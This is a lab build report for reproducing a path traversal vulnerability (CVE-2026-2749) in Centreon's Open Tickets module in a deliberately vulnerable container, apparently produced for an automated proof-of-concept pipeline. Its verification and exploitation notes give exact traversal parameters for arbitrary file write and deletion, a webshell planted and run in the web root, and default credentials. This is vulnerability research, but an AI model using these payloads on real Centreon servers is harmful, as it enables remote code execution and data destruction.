# Lab Build Report: CVE-2026-2749

## Lab Architecture

**Type**: Single-container minimal PHP reproduction

The lab reproduces the CVE-2026-2749 path traversal vulnerability using a minimal PHP + Apache container that deploys only the vulnerable code files from the Centreon Open Tickets module. This approach was chosen because:

- The vulnerable code has **no database dependencies** — it only uses PHP sessions and filesystem operations
- A full Centreon stack (MariaDB, Centreon Web, Engine, Broker, etc.) would add unnecessary complexity
- The vulnerable `uploadFile.php` and `removeFile.php` files are standalone PHP scripts included by a router
- Authentication is simulated via a mock login endpoint that sets `$_SESSION['centreon']` (the only auth check the vulnerable code makes)

### Container Topology

| Container | Image | Role |
|-----------|-------|------|
| `cve-2026-2749-vulnerable` | `php:8.2-apache-bookworm` (custom build) | PHP 8.2 + Apache serving the vulnerable Open Tickets upload/remove endpoints |

### Network

| Network | Driver |
|---------|--------|
| `lab-net` | bridge |

---

## Container Details

### cve-2026-2749-vulnerable

| Field | Value |
|-------|-------|
| **Base Image** | `php:8.2-apache-bookworm` |
| **PHP Version** | 8.2.30 |
| **Web Server** | Apache 2.4.66 |
| **Port Mapping** | 8080:80 |
| **Health Check** | `curl -f http://localhost/centreon/index.php` |
| **Build Status** | ✅ Success |

**Deployed Files:**

| File | Container Path | Description |
|------|---------------|-------------|
| `vulnerable/call.php` | `/var/www/html/centreon/modules/centreon-open-tickets/views/rules/ajax/call.php` | Simplified router (preserves vulnerable routing logic, removes Centreon class dependencies) |
| `vulnerable/uploadFile.php` | `.../ajax/actions/uploadFile.php` | **Original vulnerable file** — copied directly from source repo at tag `centreon-open-tickets-25.10.2` |
| `vulnerable/removeFile.php` | `.../ajax/actions/removeFile.php` | **Original vulnerable file** — copied directly from source repo at tag `centreon-open-tickets-25.10.2` |
| `vulnerable/login.php` | `/var/www/html/centreon/login.php` | Mock Centreon login (sets `$_SESSION['centreon']` for authentication) |
| `vulnerable/index.php` | `/var/www/html/centreon/index.php` | Lab info / health check endpoint |
| `vulnerable/centreon.conf` | `/etc/apache2/sites-available/centreon.conf` | Apache VirtualHost configuration |

---

## Start/Stop Commands

```bash
# Start the lab
docker compose up -d

# Check status
docker compose ps

# View logs
docker compose logs -f vulnerable

# Stop the lab
docker compose down

# Full rebuild (after Dockerfile changes)
docker compose build --no-cache
docker compose up -d
```

### Accessing the Lab Container

```bash
# Get container IP
CONTAINER_IP=$(docker inspect cve-2026-2749-vulnerable --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')

# Health check
curl "http://${CONTAINER_IP}/centreon/index.php"
```

---

## Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/centreon/index.php` | GET | Lab info / health check |
| `/centreon/login.php` | GET | Auth status check |
| `/centreon/login.php` | POST | Mock login (sets PHP session) |
| `/centreon/modules/centreon-open-tickets/views/rules/ajax/call.php?action=upload-file&uniqId=<id>` | POST (multipart) | **Vulnerable upload endpoint** |
| `/centreon/modules/centreon-open-tickets/views/rules/ajax/call.php` | POST (form data w/ JSON) | **Vulnerable remove endpoint** |

### Authentication

**Default Credentials**: `admin` / `Centreon!2021`

```bash
# Login (note: URL-encode the ! as %21)
curl -c /tmp/cookies.txt -X POST "http://${CONTAINER_IP}/centreon/login.php" \
  --data-raw 'useralias=admin&password=Centreon%212021'

# Subsequent requests use the PHPSESSID cookie
curl -b /tmp/cookies.txt "http://${CONTAINER_IP}/centreon/..."
```

---

## Verification Evidence

### 1. Container Running and Healthy

```
NAME                      IMAGE            STATUS                   PORTS
cve-2026-2749-vulnerable  lab-vulnerable   Up 4 minutes (healthy)   0.0.0.0:8080->80/tcp
```

### 2. PHP Version and Endpoints Functional

```json
{
  "lab": "CVE-2026-2749 — Centreon Open Tickets Path Traversal",
  "status": "running",
  "php_version": "8.2.30",
  "temp_dir": "/tmp"
}
```

### 3. Authentication Works

```json
{"status":"ok","authenticated":true,"session_id":"db8c9dbbe91f711e39161622cda649ad"}
```

### 4. Path Traversal — Arbitrary File Write (Confirmed ✅)

**Test**: Uploaded a file with `uniqId=../../tmp/proof` — the file was written to `/tmp/proof__proof.txt` (outside `/tmp/opentickets/`).

```
$ docker exec cve-2026-2749-vulnerable cat /tmp/proof__proof.txt
CVE-2026-2749 PATH TRAVERSAL PROOF - written via uniqId traversal
```

### 5. Remote Code Execution (Confirmed ✅)

**Test**: Uploaded a PHP webshell with `uniqId=../../var/www/html/centreon/shell` — the webshell was written to `/var/www/html/centreon/shell__shell.php` and executed successfully.

```
$ curl "http://${CONTAINER_IP}/centreon/shell__shell.php?cmd=id"
CVE-2026-2749-RCE:uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ curl "http://${CONTAINER_IP}/centreon/shell__shell.php?cmd=whoami"
CVE-2026-2749-RCE:www-data
```

### 6. Arbitrary File Deletion (Confirmed ✅)

**Test**: Used the remove-file endpoint with `uniqId=../../tmp/proof` and `filename=proof.txt` — the file `/tmp/proof__proof.txt` was deleted.

```
$ docker exec cve-2026-2749-vulnerable ls /tmp/proof__proof.txt
ls: cannot access '/tmp/proof__proof.txt': No such file or directory
SUCCESS: File was deleted via path traversal
```

### 7. Authentication Enforced (Confirmed ✅)

Unauthenticated requests return empty responses (the `exit` call in `call.php`):
```
$ curl -s "http://${CONTAINER_IP}/centreon/.../call.php?action=upload-file&uniqId=test" -F 'file=@...'
(empty response - auth blocked)
```

---

## Exploitation Notes for PoC Agent

### Path Traversal Mechanics

The vulnerable code constructs paths as:
```
$file_dst = $dir . '/opentickets/' . $uniq_id . '__' . $file['name'];
```
Which evaluates to: `/tmp/opentickets/{uniqId}__{filename}`

**Key finding**: The traversal must happen through the `uniqId` parameter (not the filename) because:
- `uniqId` appears directly after `/opentickets/`, so `../` in `uniqId` traverses up from `/tmp/opentickets/`
- The filename approach (`../../` in `$file['name']`) does NOT work because the `__` concatenation creates a path component like `abcdef1234567__..` which is not `..` — it's a literal directory name that doesn't exist
- PHP's `rename()` requires the parent directory of the destination to exist

### Exploitation Patterns

**File Write (via `uniqId` traversal)**:
- `uniqId=../../var/www/html/centreon/shell` + `filename=x.php`
- Creates: `/tmp/opentickets/../../var/www/html/centreon/shell__x.php` → `/var/www/html/centreon/shell__x.php`
- The `__x.php` suffix is cosmetic — the file is still a valid PHP file accessible via HTTP

**File Delete (via `uniqId` + `filename` traversal)**:
- JSON body: `{"action":"remove-file","uniqId":"../../tmp/proof","filename":"proof.txt"}`
- Deletes: `/tmp/opentickets/../../tmp/proof__proof.txt` → `/tmp/proof__proof.txt`

### Multipart Upload Requirements

- Standard `curl -F` **strips directory components** from filenames — you MUST use raw HTTP or Python's `requests` library to include `../` in the multipart filename header
- However, since the traversal goes through `uniqId` (query parameter), not the filename, `curl -F` works fine for the upload payload
- The `uniqId` is passed in the URL query string: `?action=upload-file&uniqId=../../path/to/target`

### Authentication Flow

1. POST to `/centreon/login.php` with `useralias=admin&password=Centreon%212021`
2. Capture the `PHPSESSID` cookie from the response
3. Include the cookie in all subsequent requests to the vulnerable endpoints
4. The session cookie provides `$_SESSION['centreon']` which is the only auth check

---

## Known Issues and Workarounds

| Issue | Workaround |
|-------|------------|
| Bash history expansion interprets `!` in `Centreon!2021` | Use `--data-raw` with `%21` URL-encoding, or use Python for HTTP requests |
| `curl -F` strips directory components from filenames | Use raw HTTP/Python for filename-based traversal; not needed for `uniqId` traversal |
| Lab is minimal — no Centreon UI, database, or monitoring features | Intentional — only the vulnerable code path is reproduced |
| Container IP changes on restart | Use `docker inspect` to get the current IP |

---

## Files Created

```
CVE-2026-2749/
├── Dockerfile.vulnerable          # PHP 8.2 + Apache with vulnerable files
├── docker-compose.yml             # Single-container orchestration
└── vulnerable/
    ├── call.php                   # Minimal router (mocks Centreon deps)
    ├── centreon.conf              # Apache VirtualHost config
    ├── index.php                  # Health check / info endpoint
    ├── login.php                  # Mock Centreon authentication
    ├── removeFile.php             # ORIGINAL vulnerable file (from source)
    └── uploadFile.php             # ORIGINAL vulnerable file (from source)
```
